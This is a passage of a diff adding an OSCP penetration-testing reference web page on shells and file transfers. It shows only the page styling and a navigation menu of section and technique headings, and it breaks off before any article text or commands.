@@ -1,0 +1,1297 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="color-scheme" content="light"><title>Establish sessions and move files — OSCP Reference</title><meta name="description" content="Plain OSCP reference: commands, explanations, interpretation and next checks."><link rel="canonical" href="https://armaanleg3nd.github.io/oscp/notes/methods/sessions-transfers/"><style>:root{color-scheme:light}html{color:#000;background:#fff;scroll-padding-top:1rem}body{margin:0;font:17px/1.5 Times New Roman,Times,serif}a,a:visited{color:#00e;text-decoration:underline}a:focus-visible,summary:focus-visible{outline-offset:3px;outline:2px solid #000}#reference-index{box-sizing:border-box;background:#fff;border-right:1px solid #888;width:19rem;padding:.75rem 1rem;position:fixed;inset:0 auto 0 0;overflow:auto}#reference-index>p:first-child{margin-top:0}nav{overflow-wrap:anywhere;font-size:15px;line-height:1.4}nav ul{margin:.35rem 0;padding-left:1.15rem}nav>ul{padding-left:1rem}nav li{margin:.3rem 0}nav summary{cursor:pointer}nav [aria-current=page]{font-weight:700}main{min-width:0;margin-left:19rem;padding:1rem 2rem 3rem}article{overflow-wrap:anywhere;min-width:0;max-width:85ch}h1{font-size:2em;line-height:1.15}h2{margin-top:1.7em;font-size:1.5em}h3{margin-top:1.5em;font-size:1.2em}h4,h5,h6{margin-top:1.3em;font-size:1em}pre,code{font-family:Courier New,Courier,monospace;font-size:.9em}pre{white-space:pre;overflow-wrap:normal;background:#f5f5f5;border:1px solid #aaa;padding:.7rem;overflow-x:auto}table{border-collapse:collapse;max-width:100%;margin:1rem 0;display:block;overflow-x:auto}th,td{vertical-align:top;text-align:left;border:1px solid #aaa;padding:.35rem .55rem}th{background:#eee}blockquote{border-left:2px solid #aaa;margin-left:0;padding-left:1rem}img,svg{max-width:100%;height:auto}article details{margin:1rem 0}article summary{cursor:pointer}.skip{z-index:2;background:#fff;padding:.5rem;position:fixed;top:0;left:-10000px}.skip:focus{left:0}@media (width<=700px){html{scroll-padding-top:calc(32dvh + 1rem)}#reference-index{z-index:1;border-bottom:1px solid #888;border-right:0;width:100%;height:32dvh;inset:0 0 auto}main{margin-left:0;padding:calc(32dvh + 1rem) 1rem 2rem}body{font-size:16px}}
+</style></head><body><a class="skip" href="#document">Skip to document</a><aside id="reference-index"><p><strong><a href="/oscp/">OSCP Reference</a></strong></p><nav aria-label="Reference index"><p><a href="/oscp/notes/ad-investigation/">AD Notes</a> · <a href="/oscp/notes/ad-investigation/quick-reference/">AD quick reference</a></p><details open><summary>On this page</summary><ul><li><a href="/oscp/notes/methods/sessions-transfers/#first-pass-tools-and-findings">First pass: tools and findings</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#verify-the-host-and-command-identity">Verify the host and command identity</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#transfer-a-reviewed-tool-through-a-reachable-route">Transfer a reviewed tool through a reachable route</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#discovery-workflow">Discovery workflow</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#method-families">Method families</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#choose-a-method">Choose a method</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#verify-command-execution-host-and-represented-identity">Verify command execution, host and represented identity</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#1-purpose-and-result">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#2-recognition-clues">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#find-the-clue-from-your-starting-access">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#3-prerequisites">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#4-discover-and-verify-prerequisites">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#5-why-it-works">5. Why it works</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#6-execute-and-choose-variants">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#7-worked-example--hypothetical">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#8-verify-the-result">8. Verify the result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#9-failure-and-fallback">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#10-next-transitions">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#connect-a-linux-reverse-shell-through-an-available-interpreter">Connect a Linux reverse shell through an available interpreter</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#1-purpose-and-result-1">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#2-recognition-clues-1">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#find-the-clue-from-your-starting-access-1">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#3-prerequisites-1">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#4-discover-and-verify-prerequisites-1">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#5-why-it-works-1">5. Why it works</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#6-execute-and-choose-variants-1">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#7-worked-example--hypothetical-1">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#8-verify-the-result-1">8. Verify the result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#9-failure-and-fallback-1">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#10-next-transitions-1">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#use-windows-authenticated-access-or-a-powershell-command-channel">Use Windows authenticated access or a PowerShell command channel</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#1-purpose-and-result-2">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#2-recognition-clues-2">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#find-the-clue-from-your-starting-access-2">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#3-prerequisites-2">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#4-discover-and-verify-prerequisites-2">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#5-why-it-works-2">5. Why it works</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#6-execute-and-choose-variants-2">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#7-worked-example--hypothetical-2">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#8-verify-the-result-2">8. Verify the result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#9-failure-and-fallback-2">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#10-next-transitions-2">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#use-a-bind-shell-when-the-target-can-accept-inbound-connections">Use a bind shell when the target can accept inbound connections</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#1-purpose-and-result-3">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#2-recognition-clues-3">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#find-the-clue-from-your-starting-access-3">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#3-prerequisites-3">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#4-discover-and-verify-prerequisites-3">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#5-why-it-works-3">5. Why it works</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#6-execute-and-choose-variants-3">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#7-worked-example--hypothetical-3">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#8-verify-the-result-3">8. Verify the result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#9-failure-and-fallback-3">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#10-next-transitions-3">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#generate-a-payload-matching-os-process-format-and-handler">Generate a payload matching OS, process, format and handler</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#1-purpose-and-result-4">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#2-recognition-clues-4">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#find-the-clue-from-your-starting-access-4">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#3-prerequisites-4">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#4-discover-and-verify-prerequisites-4">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#5-why-it-works-4">5. Why it works</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#6-execute-and-choose-variants-4">6. Execute and choose variants</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#staged-versus-stageless">Staged versus stageless</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#existing-poc-payload-constraints">Existing-PoC payload constraints</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#7-worked-example--hypothetical-4">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#8-verify-the-result-4">8. Verify the result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#9-failure-and-fallback-4">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#10-next-transitions-4">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#repair-a-limited-linux-terminal">Repair a limited Linux terminal</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#1-purpose-and-result-5">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#2-recognition-clues-5">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#find-the-clue-from-your-starting-access-5">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#3-prerequisites-5">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#4-discover-and-verify-prerequisites-5">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#5-why-it-works-5">5. Why it works</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#6-execute-and-choose-variants-5">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#7-worked-example--hypothetical-5">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#8-verify-the-result-5">8. Verify the result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#9-failure-and-fallback-5">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#10-next-transitions-5">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#transfer-over-http-using-linux-or-windows-clients">Transfer over HTTP using Linux or Windows clients</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#1-purpose-and-result-6">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#2-recognition-clues-6">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#find-the-clue-from-your-starting-access-6">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#3-prerequisites-6">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#4-discover-and-verify-prerequisites-6">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#5-why-it-works-6">5. Why it works</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#6-execute-and-choose-variants-6">6. Execute and choose variants</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#serve-a-fixed-directory-without-changing-folders">Serve a fixed directory without changing folders</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#linux-target-with-curl">Linux target with curl</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#windows-target-with-powershell">Windows target with PowerShell</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#windows-alternatives">Windows alternatives</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#7-worked-example--hypothetical-6">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#8-verify-the-result-6">8. Verify the result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#9-failure-and-fallback-6">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#10-next-transitions-6">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#copy-files-through-an-authenticated-ssh-service">Copy files through an authenticated SSH service</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#1-purpose-and-result-7">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#2-recognition-clues-7">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#find-the-clue-from-your-starting-access-7">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#3-prerequisites-7">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#4-discover-and-verify-prerequisites-7">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#5-why-it-works-7">5. Why it works</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#6-execute-and-choose-variants-7">6. Execute and choose variants</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#kali-to-a-linux-target">Kali to a Linux target</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#linux-target-to-kali">Linux target to Kali</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#ssh-key-or-nonstandard-port">SSH key or nonstandard port</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#7-worked-example--hypothetical-7">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#8-verify-the-result-7">8. Verify the result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#9-failure-and-fallback-7">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#10-next-transitions-7">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#move-windows-files-through-an-authenticated-smb-share">Move Windows files through an authenticated SMB share</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#1-purpose-and-result-8">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#2-recognition-clues-8">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#find-the-clue-from-your-starting-access-8">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#3-prerequisites-8">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#4-discover-and-verify-prerequisites-8">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#5-why-it-works-8">5. Why it works</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#6-execute-and-choose-variants-8">6. Execute and choose variants</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#start-an-authenticated-smb-share-on-kali">Start an authenticated SMB share on Kali</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#connect-and-download-from-windows">Connect and download from Windows</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#upload-evidence-from-windows-to-kali">Upload evidence from Windows to Kali</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#7-worked-example--hypothetical-8">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#8-verify-the-result-8">8. Verify the result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#9-failure-and-fallback-8">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#10-next-transitions-8">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#stream-a-file-over-a-direct-tcp-connection">Stream a file over a direct TCP connection</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#1-purpose-and-result-9">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#2-recognition-clues-9">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#find-the-clue-from-your-starting-access-9">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#3-prerequisites-9">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#4-discover-and-verify-prerequisites-9">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#5-why-it-works-9">5. Why it works</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#6-execute-and-choose-variants-9">6. Execute and choose variants</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#retrieve-a-file-from-the-target-to-kali">Retrieve a file from the target to Kali</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#send-a-file-from-kali-to-the-target">Send a file from Kali to the target</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#7-worked-example--hypothetical-9">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#8-verify-the-result-9">8. Verify the result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#9-failure-and-fallback-9">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#10-next-transitions-9">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#move-a-small-artifact-through-a-text-only-channel">Move a small artifact through a text-only channel</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#1-purpose-and-result-10">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#2-recognition-clues-10">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#find-the-clue-from-your-starting-access-10">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#3-prerequisites-10">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#4-discover-and-verify-prerequisites-10">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#5-why-it-works-10">5. Why it works</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#6-execute-and-choose-variants-10">6. Execute and choose variants</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#encode-on-linux">Encode on Linux</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#decode-on-linux">Decode on Linux</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#decode-in-powershell">Decode in PowerShell</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#7-worked-example--hypothetical-10">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#8-verify-the-result-10">8. Verify the result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#9-failure-and-fallback-10">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#10-next-transitions-10">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#use-a-temporary-ftp-transfer-as-a-constrained-fallback">Use a temporary FTP transfer as a constrained fallback</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#1-purpose-and-result-11">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#2-recognition-clues-11">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/sessions-transfers/#find-the-clue-from-your-starting-access-11">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#3-prerequisites-11">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#4-discover-and-verify-prerequisites-11">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#5-why-it-works-11">5. Why it works</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#6-execute-and-choose-variants-11">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#7-worked-example--hypothetical-11">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#8-verify-the-result-11">8. Verify the result</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#9-failure-and-fallback-11">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/sessions-transfers/#10-next-transitions-11">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/sessions-transfers/#sources-and-shared-concepts">Sources and shared concepts</a></li></ul></details><ul><li><details><summary>Operational procedures</summary><ul><li><details><summary><a href="/oscp/reference/01-discovery-scanning/">01 — Discovery and scanning</a></summary><ul><li><a href="/oscp/reference/01-discovery-scanning/01-path-and-host-discovery/">Path and Host Discovery</a></li><li><a href="/oscp/reference/01-discovery-scanning/02-tcp-scanning/">TCP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/03-service-identification/">Service Identification</a></li><li><a href="/oscp/reference/01-discovery-scanning/04-udp-scanning/">UDP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/05-results-and-next-actions/">Scan Results and Next Actions</a></li><li><a href="/oscp/reference/01-discovery-scanning/06-windows-network-checks/">Windows Network Checks</a></li><li><a href="/oscp/reference/01-discovery-scanning/07-scanner-alternatives/">Scanner Alternatives and Web Baseline Checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/02-service-enumeration/">02 — Service enumeration</a></summary><ul><li><a href="/oscp/reference/02-service-enumeration/01-ftp/">FTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/02-ssh/">SSH Enumeration and Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/03-smtp/">SMTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/04-dns/">DNS Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/05-nfs-rpc/">NFS and Unix RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/06-smb-rpc/">SMB and MS-RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/07-snmp/">SNMP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/08-databases/">Database Enumeration and Privilege Boundaries</a></li><li><a href="/oscp/reference/02-service-enumeration/09-windows-remote-access/">Windows Remote-Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/10-http-web-mapping/">HTTP and Web Application Mapping</a></li><li><a href="/oscp/reference/02-service-enumeration/11-ldap-kerberos/">LDAP and Kerberos Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/12-sip-irc/">SIP and IRC Triage</a></li><li><a href="/oscp/reference/02-service-enumeration/13-memcached-webdav/">Memcached and WebDAV</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/03-initial-access/">03 — Initial access</a></summary><ul><li><a href="/oscp/reference/03-initial-access/01-rdp-access/">RDP Access</a></li><li><a href="/oscp/reference/03-initial-access/02-web-file-handling/">Web File Read, Inclusion and Upload Paths</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/">Command and Manual SQL Injection</a></li><li><a href="/oscp/reference/03-initial-access/04-access-control-and-xss/">Web Access Control, API Logic and XSS</a></li><li><a href="/oscp/reference/03-initial-access/05-wordpress-and-ssrf/">WordPress and SSRF Paths</a></li><li><a href="/oscp/reference/03-initial-access/06-public-exploit-adaptation/">Public Exploit Selection and Adaptation</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/04-shells-transfers-credentials/">04 — Shells, transfers and credentials</a></summary><ul><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/">File Transfer</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/">Shells, Payloads and Session Repair</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/">Credential Classification, Cracking and Reuse</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/04-file-and-repository-hunting/">File and Repository Hunting</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/05-python-tool-environments/">Python Tool Environments</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/">Payload Execution Obstacles</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/05-local-privilege-escalation/">05 — Local privilege escalation</a></summary><ul><li><a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/">Linux Privilege Escalation</a></li><li><a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/">Windows Privilege Escalation</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/06-ad-lateral-movement/">06 — AD and lateral movement</a></summary><ul><li><a href="/oscp/reference/06-ad-lateral-movement/01-domain-mapping/">Active Directory Domain Mapping</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/">Windows and Domain Credential Access</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/">Kerberos and Identity Transitions</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/">Object Control, AD CS and Domain Compromise</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/05-lateral-movement/">Lateral Movement</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts/">Conditional AD infrastructure and trust checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/07-pivoting-tunneling/">07 — Pivoting and tunneling</a></summary><ul><li><a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/">Tunneling and Port Forwarding</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/08-evidence-reporting/">08 — Evidence and reporting</a></summary><ul><li><a href="/oscp/reference/08-evidence-reporting/01-attack-tracking-and-evidence/">Integrated Attack Tracking and Evidence</a></li></ul></details></li><li><a href="/oscp/reference/INDEX/">Complete operational task index</a></li></ul></details></li><li><details><summary><a href="/oscp/cheatsheets/">Cheatsheets</a></summary><ul><li><a href="/oscp/cheatsheets/active-directory/">Active Directory Cheatsheet</a></li><li><a href="/oscp/cheatsheets/ad-investigation/">AD Investigation — Where to Look and What Output Means</a></li><li><a href="/oscp/cheatsheets/credentials-cracking/">Credentials and Cracking Cheatsheet</a></li><li><a href="/oscp/cheatsheets/discovery-scanning/">Discovery and Scanning Cheatsheet</a></li><li><a href="/oscp/cheatsheets/evidence-reporting/">Integrated Attack and Reporting Cheatsheet</a></li><li><a href="/oscp/cheatsheets/linux-privesc/">Linux Privilege Escalation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/payload-execution/">Payload Execution Obstacles Cheatsheet</a></li><li><a href="/oscp/cheatsheets/pivoting/">Pivoting and Tunneling Cheatsheet</a></li><li><a href="/oscp/cheatsheets/public-exploits/">Public Exploit Adaptation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/service-opportunities/">Service Opportunity Cheatsheet</a></li><li><a href="/oscp/cheatsheets/shells-payloads/">Shells and Payloads Cheatsheet</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/">Tool Command Reference</a></li><li><a href="/oscp/cheatsheets/tool-selection/">Tool Selection Matrix</a></li><li><a href="/oscp/cheatsheets/tools-and-scripts/">Tools and scripts by task</a></li><li><a href="/oscp/cheatsheets/web-exploitation/">Web Exploitation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/web-mapping/">Web Mapping Cheatsheet</a></li><li><a href="/oscp/cheatsheets/windows-privesc/">Windows Privilege Escalation Cheatsheet</a></li></ul></details></li><li><details open><summary>Study notes</summary><ul><li><a href="/oscp/notes/Attack_Strategy_Map/">Attack Strategy Map</a></li><li><a href="/oscp/notes/GetSH_Coverage/">getSH Source Coverage</a></li><li><a href="/oscp/notes/Master_Notes/">Master Notes</a></li><li><a href="/oscp/notes/Recognition_Practice/">Recognition practice</a></li><li><a href="/oscp/notes/Speedrun_Breakdown/">Attack-first OSCP speedrun breakdown</a></li><li><details><summary><a href="/oscp/notes/ad-investigation/">AD Notes — focused checks</a></summary><ul><li><a href="/oscp/notes/ad-investigation/acl/">An ACL shows a powerful right — can I actually use it?</a></li><li><a href="/oscp/notes/ad-investigation/asrep/">Can this account produce AS-REP roasting material?</a></li><li><a href="/oscp/notes/ad-investigation/bloodhound/">How do I turn a BloodHound graph into a verified path?</a></li><li><a href="/oscp/notes/ad-investigation/conditional/">When should I investigate AD CS, delegation or GPOs?</a></li><li><a href="/oscp/notes/ad-investigation/context/">What identity and domain am I actually using?</a></li><li><a href="/oscp/notes/ad-investigation/credential-sources/">On a controlled host, where could useful credentials exist?</a></li><li><a href="/oscp/notes/ad-investigation/failure/">A command failed or returned nothing — what can I conclude?</a></li><li><a href="/oscp/notes/ad-investigation/files/">I found a script or configuration file — what matters?</a></li><li><a href="/oscp/notes/ad-investigation/hosts/">Which computers can this identity access?</a></li><li><a href="/oscp/notes/ad-investigation/kerberoast/">I found a service account — is Kerberoasting useful?</a></li><li><a href="/oscp/notes/ad-investigation/managed/">Can I read a LAPS or gMSA secret?</a></li><li><a href="/oscp/notes/ad-investigation/material/">I found a secret — what kind is it and where can I use it?</a></li><li><a href="/oscp/notes/ad-investigation/movement/">I have credentials — which remote-access method fits?</a></li><li><a href="/oscp/notes/ad-investigation/object-change/">Which identity change follows from a validated object right?</a></li><li><a href="/oscp/notes/ad-investigation/policy/">How do I interpret password policy before testing credentials?</a></li><li><a href="/oscp/notes/ad-investigation/quick-reference/">AD — Quick Reference</a></li><li><a href="/oscp/notes/ad-investigation/read-output/">How to read command output</a></li><li><a href="/oscp/notes/ad-investigation/reenumerate/">I gained a new account or host — what do I check again?</a></li><li><a href="/oscp/notes/ad-investigation/replication/">Does this identity really have DCSync rights?</a></li><li><a href="/oscp/notes/ad-investigation/routes/">Is this an access failure or a missing 